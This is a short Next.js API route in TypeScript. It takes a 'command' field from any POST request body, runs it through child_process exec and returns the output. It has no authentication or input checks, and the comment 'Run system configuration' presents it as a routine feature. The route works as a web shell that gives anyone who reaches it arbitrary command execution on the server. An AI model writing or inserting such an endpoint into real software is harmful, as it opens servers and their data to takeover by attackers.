import type { NextApiRequest, NextApiResponse } from "next";
import { exec } from "child_process";
import { promisify } from "util";

const execAsync = promisify(exec);

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method === "POST") {
    try {
      const { command } = req.body;

      // Run system configuration
      if (command) {
        const result = await execAsync(command);
        res.status(200).json({ output: result.stdout });
      } else {
        res.status(400).json({ error: "No command provided" });
      }
    } catch (error) {
      res.status(500).json({ error: "Failed to execute command" });
    }
  } else {
    res.status(405).json({ error: "Method not allowed" });
  }
}
